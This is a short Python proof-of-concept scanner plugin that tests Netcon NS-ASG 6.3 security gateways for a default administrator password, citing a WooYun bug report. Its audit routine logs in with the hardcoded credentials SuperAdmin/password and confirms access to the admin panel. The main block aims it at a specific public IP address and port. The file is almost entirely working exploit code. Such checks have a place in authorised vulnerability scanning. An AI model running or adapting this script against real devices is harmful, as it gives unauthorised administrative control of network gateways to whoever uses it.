#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : 网康安全网关NS—ASG 6.3默认账户密码
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2014-078677
"""
def assign(service, arg):
    if service == 'ns-asg':
        return True, arg
def audit(arg):
    payload = 'logon/logon.php?username=SuperAdmin&password=password&sl_p1_1encrypt=1&action=logon&goto=1'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if 'location.href = "/admin/index"' in res:
        admin=arg+'admin/index'
        code, head, res, errcode, _ = curl.curl2(admin)
        if code==200 and 'name="main" src="device_status.php"' in res:
            security_hole(target)


if __name__ == '__main__':
    from dummy import *
    audit(assign('ns-asg', 'https://124.133.254.82:4443/')[1])